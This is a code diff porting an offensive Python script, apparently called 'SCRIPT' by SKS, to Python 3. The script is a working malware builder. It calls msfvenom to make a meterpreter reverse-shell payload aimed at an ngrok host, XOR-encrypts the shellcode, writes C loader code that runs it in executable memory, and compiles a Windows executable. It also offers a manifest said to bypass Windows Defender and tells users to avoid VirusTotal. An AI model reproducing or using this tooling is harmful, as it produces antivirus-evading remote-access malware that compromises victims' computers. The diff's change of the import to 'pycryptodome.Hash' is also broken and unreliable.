@@ -14,7 +14,7 @@
 import random 
 import string
 import argparse
-from Crypto.Hash import MD5
+from pycryptodome.Hash import MD5
 import os
 from termcolor import colored
 shellcodeFile='./result/test.raw'
@@ -66,9 +66,9 @@ def writetofile(data, key, cipherType,lport):
 			f.write("char "+list1[5]+"[sizeof "+list1[3]+"];\nint j = 0;\nfor (int i = 0; i < sizeof "+list1[3]+"; i++) {\nif (j == sizeof "+list1[7]+" - 1) j = 0;\n"+list1[5]+"[i] = "+list1[3]+"[i] ^ "+list1[7]+"[j];\nj++;\n}\n")
 			f.write("void *"+list1[6]+" = VirtualAlloc(0, sizeof "+list1[5]+", MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy("+list1[6]+", "+list1[5]+", sizeof "+list1[5]+");CreateThread(NULL, 0,"+list1[6]+", NULL, 0, NULL);\n\nwhile (1) {\nif (!"+list1[8]+"()) { return 0; }\n}\n}\n}\n}\n")		
 			f.close()
-			print color(("[+] Encrypted Shellcode saved in [{}]".format(Filename)))
+			print (color(("[+] Encrypted Shellcode saved in [{}]".format(Filename))))
 		except IOError:
-			print color(("[!] Could not write C++ code  [{}]".format(Filename)))
+			print (color(("[!] Could not write C++ code  [{}]".format(Filename))))
 
 def color(string, color=None):
     attr = []
@@ -104,8 +104,8 @@ def color(string, color=None):
 
 if __name__ == '__main__':
 	os.system("clear")
-	print color(banner(),"green")
-	print color("""
+	print (color(banner(),"green"))
+	print (color("""
 ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗	~ Script By SKS  ☪ ~
 ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
 ███████╗██║     ██████╔╝██║██████╔╝   ██║   
@@ -113,24 +113,24 @@ if __name__ == '__main__':
 ███████║╚██████╗██║  ██║██║██║        ██║   
 ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
                                             
-""",'blue')
+""",'blue'))
 	
 	#print color("   _____ _  __ _____\n / ____| |/ // ____|\n| (___ | ' /| (___\n  \___ \|  <  \___ \ \n ____) | . \ ____) |\n|_____/|_|\_\_____/ \n ","red")	
-	payload_type=raw_input(color((' [?] Enter Payload TYPE [tcp,https,tcp_dns]: ')))
+	payload_type=input(color((' [?] Enter Payload TYPE [tcp,https,tcp_dns]: ')))
 	if payload_type=="":
 		payload_type="tcp"
-	print color((" [+] Payload TYPE : "+payload_type))
-	lhost=raw_input(color(' [?] Enter LHOST for Payload [LHOST] : '))
+	print (color((" [+] Payload TYPE : "+payload_type)))
+	lhost=input(color(' [?] Enter LHOST for Payload [LHOST] : '))
 	if lhost=="":
 		lhost="0.tcp.ngrok.io"
-	print color((" [+] LHOST for Payload [LPORT] : "+lhost))
-	lport=raw_input(color(' [?] Enter LPORT for Payload : '))
-	print color((" [+] LPORT for Payload : "+lport))
+	print (color((" [+] LHOST for Payload [LPORT] : "+lhost)))
+	lport=input(color(' [?] Enter LPORT for Payload : '))
+	print (color((" [+] LPORT for Payload : "+lport)))
 	raw_payload='msfvenom -p windows/x64/meterpreter_reverse_'+payload_type+' LHOST='+ lhost +' LPORT='+ lport +' EXITFUNC=process --platform windows -a x64 -f raw -o ./result/test.raw'
-	print color('[✔] Checking directories...','green')
+	print (color('[✔] Checking directories...','green'))
 	if not os.path.isdir("./result"):
 		os.makedirs("./result")
-		print colored(color("[+] Creating [./result] directory for resulting code files","green"))
+		print (colored(color("[+] Creating [./result] directory for resulting code files","green")))
 	os.system(raw_payload)
 	
 
@@ -145,30 +145,30 @@ if __name__ == '__main__':
 
 	print (color("[*] MD5 hash of the initial shellcode: [{}]".format(MD5.new(shellcodeBytes).hexdigest())))
 	print (color("[*] Shellcode size: [{}] bytes".format(len(shellcodeBytes))))
-	masterKey = raw_input(color(' [?] Enter the Key to Encrypt Shellcode with : '))
+	masterKey = input(color(' [?] Enter the Key to Encrypt Shellcode with : '))
 	print (color("[+] XOR Encrypting the shellcode with key [{}]".format(masterKey)))
 	transformedShellcode = xor(shellcodeBytes, masterKey)
 	
 	cipherType = 'xor'
 
 	
-	print color(("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode))))
+	print (color(("[*] Encrypted shellcode size: [{}] bytes".format(len(transformedShellcode)))))
 	
 	# Writing To File 
 	
-	print color("[*] Generating C code file")
+	print (color("[*] Generating C code file"))
 	writetofile(transformedShellcode, masterKey, cipherType,lport)
 	
 
 	# Compiling
 	exe_name='./result/final_'+lport 
-	print color('[+] Compiling file [{}] with Mingw Compiler '.format(Filename))
+	print (color('[+] Compiling file [{}] with Mingw Compiler '.format(Filename)))
 	
 	j="x86_64-w64-mingw32-gcc {} -o {}.exe".format(Filename,exe_name)
 	
 	os.system(j)
-	print color('[+] Compiled Sucessfully')
-	print color('[+] Removing Temp Files')
+	print (color('[+] Compiled Sucessfully'))
+	print (color('[+] Removing Temp Files'))
 	os.remove('./result/test.raw')
 	os.remove(Filename)
 	
@@ -176,17 +176,17 @@ if __name__ == '__main__':
 	
 	bool =input(color('[*]Do you want to add Manifest (Generally Bypasses Windows Defender)[ 1 or 0 ]?'))
 	# Display Results
-	print color("\n==================================== RESULT ====================================\n")
+	print (color("\n==================================== RESULT ====================================\n"))
 	if bool:
-		print color('[+] Adding Manifest ')
+		print (color('[+] Adding Manifest '))
 		os.system(man)
-		print color('[+] Final File with Manifest [{}.exe] '.format(exe_name))
+		print (color('[+] Final File with Manifest [{}.exe] '.format(exe_name)))
 	else:
-		print color('[+] Final File [{}.exe] '.format(exe_name))
+		print (color('[+] Final File [{}.exe] '.format(exe_name)))
 	
-	print color ('\n DO NOT UPLOAD ON VIRUS TOTAL \n',"red")
-	print color ('\n USE \"nodistribute.com \"\n',"green")
-	print color ('\n Happy Hacking \n',"green")
+	print (color ('\n DO NOT UPLOAD ON VIRUS TOTAL \n',"red"))
+	print (color ('\n USE \"nodistribute.com \"\n',"green"))
+	print (color ('\n Happy Hacking \n',"green"))
 	
 	
 
